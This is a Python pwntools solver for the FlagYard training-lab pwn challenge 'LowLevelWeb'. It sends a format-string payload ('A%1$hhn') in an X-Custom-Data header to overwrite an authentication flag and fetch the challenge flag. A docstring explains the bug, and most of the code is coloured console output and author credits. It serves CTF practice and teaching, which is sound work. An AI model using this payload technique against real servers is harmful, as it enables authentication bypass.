#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
LowLevelWeb  -  FlagYard Pwn solver

lowlevelweb (FlagYard Training Labs, Pwn) - a hand-rolled HTTP server with a
swapped fprintf() argument list. The analytics logger ends up doing:

    fprintf(stderr, X_Custom_Data_value, &auth_passed)

so the attacker-controlled header IS the format string, and the very first
variadic argument is the address of the auth gate. One %1$hhn therefore does:

    auth_passed = 1        (writes the printed char count over the dword)

Request ordering does the rest: the logging block runs before the /flag
checks, so a single request sets the gate and reads the flag:

    GET /flag?x=get  +  X-Custom-Data: A%1$hhn   ->   200 + flag

Target is given as a link/URL or host:port.
"""
from __future__ import annotations

from pwn import *
import re
import sys
import time
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def bar(frac):
    w = 20
    f = max(0.0, min(1.0, frac))
    full = int(round(f * w))
    return "[%s%s] %5.1f%%" % ("\u2588" * full, "\u2591" * (w - full), f * 100.0)

def step(msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s" % (C.BOLD + color + icon + " ",
                             C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(msg):
    step(msg, icon="\u2713", color=C.GREEN)

def tick(frac, msg):
    """single moving progress line (updates in place via carriage return)."""
    line = ("%s%s %s %s%s%s" %
            (C.BOLD + C.YELLOW + "\u25b6 ",
             C.CYAN + bar(frac) + C.RESET,
             C.DIM, C.BOLD, msg, C.RESET))
    sys.stdout.write("\r  " + line + "   ")
    sys.stdout.flush()

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("L O W L E V E L W E B   S O L V E R",
              "format-string -> auth_passed -> /flag?x=get"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono):
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (flag, C.BOLD + C.GREEN, "")])
    _row([(" " * 10, "", ""), ("elapsed %.1f s" % chrono, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def ask_target(argv):
    if len(argv) > 1 and ("//" in argv[1] or ":" in argv[1]):
        return argv[1].strip()
    raw = input("  Enter the LowLevelWeb challenge link (URL or host:port): ").strip()
    return raw or "tcp.flagyard.com:30722"

def parse_target(raw):
    raw = raw.strip()
    for pre in ("http://", "https://", "tcp://", "raw://"):
        if raw.lower().startswith(pre):
            raw = raw[len(pre):]
    raw = raw.rstrip("/")
    if raw.count(":") > 1:                      # [ipv6]:port
        host, port_s = raw.rsplit(":", 1)
    elif ":" in raw:
        host, port_s = raw.rsplit(":", 1)
    else:
        host, port_s = raw, "30722"
    return host, int(port_s)

def read_flag(raw):
    if isinstance(raw, bytes):
        raw = raw.decode("utf-8", "replace")
    m = re.search(r"(FlagY\{[^}]+\})", raw)
    return m.group(1) if m else None

def split_http(blob):
    head, _, body = blob.partition(b"\r\n\r\n")
    status = head.split(b"\r\n", 1)[0].decode("latin1", "replace")
    return status, body

# ---------------------------------------------------------------------------
# constants
# ---------------------------------------------------------------------------
FUZZ_FMT = b"A%1$hhn"          # A -> count 1 ; %1$hhn -> *(&auth_passed) = 1
EXPLOIT_HEADERS = b"X-Custom-Data: " + FUZZ_FMT + b"\r\n"
FLAG_PATH = "/flag?x=get"


def http(host, port, path, extra=b""):
    io = remote(host, port, timeout=10)
    io.send(b"GET %s HTTP/1.1\r\nHost: c\r\nConnection: close\r\n%s\r\n"
            % (path.encode(), extra))
    blob = io.recvall(timeout=5)
    io.close()
    return split_http(blob)


def main() -> None:
    t0 = time.time()
    enable_vt()
    banner()
    context.log_level = 'error'

    try:
        raw = ask_target(sys.argv)
    except Exception:
        fail("no challenge link given")
        return
    host, port = parse_target(raw)
    step("target link %s:%d" % (host, port))

    try:
        status, body = http(host, port, "/")
    except Exception as e:
        fail("cannot reach the service: %s" % (e,))
        return
    step("recon  GET /            -> %s  (%d bytes of portal)"
         % (status, len(body)))

    try:
        status, body = http(host, port, FLAG_PATH)
    except Exception as e:
        fail("cannot reach /flag: %s" % (e,))
        return
    step("gate   GET %s  -> %s  %r"
         % (FLAG_PATH, status, body.decode("utf-8", "replace").strip()[:40]))
    if read_flag(body):
        print()
        ok("FLAG = %s" % read_flag(body))
        big_flag(read_flag(body), time.time() - t0)
        return

    tick(0.35, "X-Custom-Data is fprintf()'s *format string* (args swapped)")
    time.sleep(0.35)
    tick(0.70, "%1$hhn writes char-count 1 over auth_passed @ 0x402c")
    time.sleep(0.35)

    try:
        status, body = http(host, port, FLAG_PATH, EXPLOIT_HEADERS)
    except Exception as e:
        fail("exploit request failed: %s" % (e,))
        return

    flag = read_flag(body)
    if flag:
        tick(1.0, "single request: set the auth gate, then read the flag")
        print()
        ok("%s  %s" % (status, body.decode("utf-8", "replace").strip()[:60]))
        ok("FLAG = %s" % flag)

        big_flag(flag, time.time() - t0)
        outp = Path(__file__).resolve().parent / "flag_from_lowlevelweb.txt"
        outp.write_text(flag + "\n", encoding="utf-8")
        print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))
        return

    print()
    fail("no flag in the response: %s / %r"
         % (status, body.decode("utf-8", "replace").strip()[:60]))
    fail("the instance may have rotated \u2014 re-run with a fresh link.")


if __name__ == "__main__":
    main()
